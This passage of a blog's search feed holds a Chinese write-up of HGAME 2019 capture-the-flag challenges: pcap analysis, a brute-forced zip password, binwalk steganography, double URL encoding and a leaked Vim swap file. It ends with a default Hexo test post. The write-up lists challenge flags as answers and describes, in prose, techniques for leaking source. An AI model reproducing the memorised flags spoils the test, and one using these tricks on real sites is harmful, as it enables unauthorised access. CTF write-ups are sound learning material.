,没想到这居然是《紫罗兰永恒花园》里面的东西，只怪我没看几集。于是对照此文章，得到flag：hgame{My_vi0let_tyPewRiter}无字天书这道题给的是一个流量包，wireshark看了一下，发现get了压缩包，一张图片，一个网页，那么就都导出一下，得到压缩包。解压压缩包，发现里面有password.txt和一张被加密的jpg图片，根据password.txt内容，我还以为密码需要从提取出的网页或者是图片来得到呢，毕竟它们的名字太具有欺骗性了，但是试了很久，无果。。。于是只能试一下暴力破解，只用数字居然很快就破解了出来，密码是：hgame25839421，终于得到了图片，如下：现在我们优先使用binwalk分析，果然隐藏着文件，是一个docx文档，打开但是发现什么都没有，估计是隐藏了，于是按下ctrl+a，ctrl+d，取消隐藏后看到了被隐藏起来的flag：hgame{59d28413e36019861498e823f3f41406}。Webvery easy web从题目可以看出需要对id进行两次url编码，然后通过get请求传过去即可。谁吃了我的flag这道题开始没有hint的时候没有头绪，因为真的没有一点信息暗示是vim编辑的，当然可以一个个地试出来到底备份文件是哪个，这个时候可以借助一些扫描工具。我们知道Vim编辑器备份文件格式.filename.swp，所以直接在所给url后面加上.index.html.swp即可。这里给出此文件（由于无法上传.index.html.swp文件，故将其改为了html）未完待续~]]></content>
      <categories>
        <category>CTF比赛</category>
        <category>2019HGAME</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>网络安全</tag>
        <tag>HGAME</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2019%2F02%2F16%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.Quick StartCreate a new post$ hexo new "My New Post"More info: WritingRun server$ hexo serverMore info: ServerGenerate static files$ hexo generateMore info: GeneratingDeploy to remote sites$ hexo deployMore info: Deployment这是一段测试文字haha一个普通标题一个普通标题一个普通标题短文本中等文本稍微长一点的文本稍微长一点的文本短文本中等文本使用【星号】标识无序列表使用【星号】标识无序列表使用【星号】标识无序列表我是黑体字这是一行引用hello，引用结束没？AndRoid这是测试！]]></content>
  </entry>
</search>
